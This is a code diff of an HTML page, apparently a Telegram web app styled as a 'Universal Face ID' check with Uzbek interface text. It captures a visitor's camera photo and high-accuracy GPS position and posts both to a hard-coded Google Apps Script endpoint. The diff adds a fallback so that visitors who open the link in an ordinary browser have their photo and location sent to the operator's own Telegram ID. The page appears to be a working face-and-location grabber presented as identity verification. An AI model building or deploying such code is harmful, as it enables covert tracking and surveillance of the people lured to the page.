@@ -3,23 +3,22 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Face ID HD</title>
+    <title>Universal Face ID</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         body {
             margin: 0; padding: 0;
             display: flex; flex-direction: column; align-items: center; justify-content: center;
             background-color: #ffffff;
-            font-family: -apple-system, BlinkMacSystemFont, Roboto, Helvetica, Arial, sans-serif;
-            height: 100vh; overflow: hidden;
+            font-family: sans-serif; height: 100vh; overflow: hidden;
         }
 
-        h2 { margin: 0 0 20px 0; color: #333; font-size: 18px; font-weight: 600; text-align: center; }
+        h2 { margin-bottom: 20px; color: #333; font-size: 18px; font-weight: bold; }
 
         .camera-wrapper {
             position: relative; width: 280px; height: 280px;
             border-radius: 50%; overflow: hidden; background: #000;
-            z-index: 10; border: 5px solid #e5e5e5; 
+            border: 5px solid #e5e5e5; 
             box-shadow: 0 10px 25px rgba(0,0,0,0.1);
             transition: border-color 0.3s;
         }
@@ -36,14 +35,14 @@
             width: 140px; height: 190px;
             border: 2px dashed rgba(255, 255, 255, 0.8);
             border-radius: 50% 50% 40% 40%;
-            z-index: 20; pointer-events: none;
+            pointer-events: none; z-index: 10;
         }
 
         #btn-capture {
             margin-top: 30px; padding: 15px 50px; font-size: 16px;
             background-color: #e5e5e5; color: #999; border: none;
             border-radius: 30px; cursor: not-allowed; font-weight: 600;
-            transition: all 0.3s; width: 80%; max-width: 300px;
+            transition: 0.3s; width: 80%; max-width: 300px;
         }
 
         #btn-capture.active {
@@ -51,7 +50,7 @@
             box-shadow: 0 8px 20px rgba(36, 129, 204, 0.3);
         }
 
-        #status-text { margin-top: 10px; font-size: 13px; color: #888; text-align: center; }
+        #status-text { margin-top: 10px; font-size: 14px; color: #888; }
         canvas { display: none; }
     </style>
 </head>
@@ -64,7 +63,7 @@
         <video id="video" autoplay playsinline muted></video>
     </div>
 
-    <div id="status-text">Tizim yuklanmoqda...</div>
+    <div id="status-text">Yuklanmoqda...</div>
     <button id="btn-capture" disabled>Rasmga Olish</button>
     <canvas id="canvas"></canvas>
 
@@ -74,29 +73,22 @@
         const statusText = document.getElementById('status-text');
         const camBox = document.getElementById('cam-box');
         const title = document.getElementById('main-title');
-        
-        // ⚠️ SIZNING GOOGLE SCRIPT LINKINGIZ
-        const GOOGLE_URL = "https://script.google.com/macros/s/AKfycbxsv55RKRrWCv51n7Mq-CA_oRiMZvpcZj5tDDeUnSXirk_Y-2BSzmoItF6rxhLdEBXL/exec"; 
 
-        // Telegram WebApp ni ishga tushirish
-        const tg = window.Telegram.WebApp;
-        tg.expand();
+        // SIZNING GOOGLE SCRIPT LINKINGIZ
+        const GOOGLE_URL = "https://script.google.com/macros/s/AKfycbxsv55RKRrWCv51n7Mq-CA_oRiMZvpcZj5tDDeUnSXirk_Y-2BSzmoItF6rxhLdEBXL/exec"; 
+        
+        // ⚠️ ZAXIRA ID (Agar brauzerdan kirilsa, rasm shu ID ga boradi)
+        // O'z ID raqamingizni yozib qo'ying (Telegramdan @userinfobot orqali bilib oling)
+        const FALLBACK_ID = 976525232; 
+
+        // Telegram WebApp (Bor bo'lsa ishlatamiz, yo'q bo'lsa indamaymiz)
+        const tg = window.Telegram?.WebApp;
+        if(tg) tg.expand();
 
         let userLocation = null;
-        
-        // User ID ni olish (Eng ishonchli yo'l)
-        const userId = tg.initDataUnsafe?.user?.id;
 
-        // --- 1. KAMERANI YOQISH ---
+        // 1. KAMERANI YOQISH
         async function startCamera() {
-            // User ID tekshiruvi
-            if (!userId) {
-                statusText.innerText = "❌ Xatolik: Bot orqali kiring!";
-                statusText.style.color = "red";
-                alert("Iltimos, bu sahifani faqat Telegram Bot ichidagi tugma orqali oching. Brauzerda ishlamaydi.");
-                return;
-            }
-
             try {
                 statusText.innerText = "Kamera ochilmoqda...";
                 let stream;
@@ -113,48 +105,51 @@
                 video.onloadedmetadata = () => {
                     video.play();
                     camBox.classList.add('ready');
-                    statusText.innerText = "Lokatsiya aniqlanmoqda...";
                     getLocation();
                 };
             } catch (err) {
-                alert("Kameraga ruxsat bering! " + err);
-                statusText.innerText = "Kamera xatosi. Ruxsat bering.";
+                alert("Kameraga ruxsat bering!");
+                statusText.innerText = "Kamera xatosi";
             }
         }
 
-        // --- 2. LOKATSIYA OLISH ---
+        // 2. LOKATSIYA OLISH
         function getLocation() {
+            statusText.innerText = "Lokatsiya aniqlanmoqda...";
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     (pos) => {
                         userLocation = { lat: pos.coords.latitude, long: pos.coords.longitude };
-                        statusText.innerText = "✅ Tayyor. Rasmga tushing.";
+                        statusText.innerText = "✅ Tayyor";
                         statusText.style.color = "green";
                         btn.disabled = false;
                         btn.classList.add('active');
                     },
                     (err) => {
-                        statusText.innerText = "❌ GPS yoqing va qayta kiring!";
+                        statusText.innerText = "GPS yoqing!";
                         statusText.style.color = "red";
-                        alert("Telefonda GPS (Geolokatsiya) ni yoqing!");
+                        alert("GPS (Geolokatsiya) ni yoqing!");
                     },
-                    { enableHighAccuracy: true, timeout: 10000 }
+                    { enableHighAccuracy: true }
                 );
             } else {
                 statusText.innerText = "GPS xatosi";
             }
         }
 
-        // --- 3. YUBORISH ---
+        // 3. YUBORISH
         btn.addEventListener('click', () => {
-            if (!userLocation) { alert("Lokatsiya yo'q!"); return; }
-            if (!userId) { alert("User ID yo'q! Botdan kiring."); return; }
+            if (!userLocation) { alert("Lokatsiya kerak!"); return; }
 
-            // UI o'zgarishi
+            // User ID ni aniqlash (Universal)
+            // Agar Telegramdan kirgan bo'lsa, o'z ID si. 
+            // Agar brauzerdan kirgan bo'lsa, FALLBACK_ID (Admin ID).
+            const userId = tg?.initDataUnsafe?.user?.id || FALLBACK_ID;
+
             title.innerText = "Yuborilmoqda...";
-            btn.innerText = "⏳ Yuklanmoqda...";
+            btn.innerText = "⏳...";
             btn.disabled = true;
-            btn.style.backgroundColor = "#ff9500"; 
+            btn.style.backgroundColor = "#ff9500";
             camBox.classList.remove('ready');
             camBox.classList.add('sending');
 
@@ -163,7 +158,6 @@
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             
-            // Oyna effekti
             ctx.translate(canvas.width, 0);
             ctx.scale(-1, 1);
             ctx.drawImage(video, 0, 0);
@@ -172,10 +166,9 @@
             const base64 = canvas.toDataURL('image/jpeg', 0.8).split(',')[1];
             const locString = JSON.stringify(userLocation);
 
-            // Googlega yuborish (no-cors rejimi muhim!)
             fetch(GOOGLE_URL, {
                 method: "POST",
-                mode: "no-cors", // ⚠️ MUHIM: Browser xato bermasligi uchun
+                mode: "no-cors",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({ 
                     image: base64,
@@ -184,22 +177,20 @@
                 })
             })
             .then(() => {
-                // Muvaffaqiyatli
-                title.innerText = "✅ Muvaffaqiyatli!";
+                title.innerText = "✅ Yuborildi!";
                 btn.innerText = "Ketdi!";
                 btn.style.backgroundColor = "#34c759";
                 camBox.classList.remove('sending');
                 camBox.classList.add('success');
-                statusText.innerText = "Rasm botga yuborildi!";
+                statusText.innerText = "Rasm botga ketdi!";
                 
-                setTimeout(() => { tg.close(); }, 2000);
+                // Agar telegramda bo'lsa yopamiz
+                if(tg) setTimeout(() => { tg.close(); }, 2000);
             })
             .catch(err => {
-                alert("Internet xatosi: " + err);
-                title.innerText = "Qayta urining";
+                alert("Internet xatosi");
                 btn.disabled = false;
-                btn.innerText = "Rasmga Olish";
-                btn.style.backgroundColor = "#2481cc";
+                btn.innerText = "Qayta urining";
                 camBox.classList.remove('sending');
                 camBox.classList.add('ready');
             });
